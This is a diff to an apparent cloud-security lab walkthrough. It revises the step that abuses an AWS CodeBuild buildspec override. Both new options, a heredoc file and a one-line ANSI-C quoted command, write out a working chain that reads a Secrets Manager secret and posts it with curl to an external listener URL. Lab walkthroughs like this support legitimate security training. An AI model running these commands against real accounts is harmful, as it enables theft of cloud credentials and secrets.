@@ -48,21 +48,47 @@ Make note of your listener URL, the webhook.site URL.
 
 ## Step 4 — Inject Inline Buildspec and Start the Build
 
-Replace `<project-name>` and `<listener-url>` with your values.
+Replace `<cgid>`, `<paste the value copied in Step 2>`, and `<listener-url>` with your values. Either option below achieves the same result.
+
+### Option A — Buildspec File
+
+Write the buildspec override to a local file:
 
 ```bash
-aws codebuild start-build \
-  --project-name cg-vulnerable-project-<cgid> \
-  --buildspec-override '
+cat > /tmp/buildspec_override.yml << 'EOF'
+
 version: 0.2
 phases:
   build:
     commands:
-      - VALUE=$(aws secretsmanager get-secret-value --secret-id <paste the value copied in Step 2> --query "SecretString" --output text)
-      - curl -s -X POST "<listener-url>" -H "Content-Type: application/json" -d "$VALUE"
-' \
-  --profile bob
+      - |
+        VALUE=$(aws secretsmanager get-secret-value --secret-id <paste the value copied in Step 2> --query "SecretString" --output text)
+        curl -s -X POST "<listener-url>" -H "Content-Type: application/json" -d "$VALUE"
+EOF
 ```
+
+Then start the build, pointing `--buildspec-override` at the file:
+
+```bash
+aws codebuild start-build \
+  --project-name cg-vulnerable-project-<cgid> \
+  --buildspec-override file:///tmp/buildspec_override.yml \
+  --profile bob \
+  --region us-east-1
+```
+
+### Option B — Direct Command
+
+A single command with no intermediate file, using an ANSI-C quoted string so the newlines are passed as `\n` instead of typed literally:
+
+```bash
+aws codebuild start-build \
+  --project-name cg-vulnerable-project-test01 \
+  --buildspec-override $'version: 0.2\nphases:\n  build:\n    commands:\n      - |\n        VALUE=$(aws secretsmanager get-secret-value --secret-id <paste the value copied in Step 2> --query "SecretString" --output text)\n      - |\n         curl -s -X POST "<listener-url>" -H "Content-Type: application/json" -d "$VALUE"'\
+  --profile bob \
+  --region us-east-1
+```
+
 
 Note the `id` returned in the response, you can use it to track the build.
 
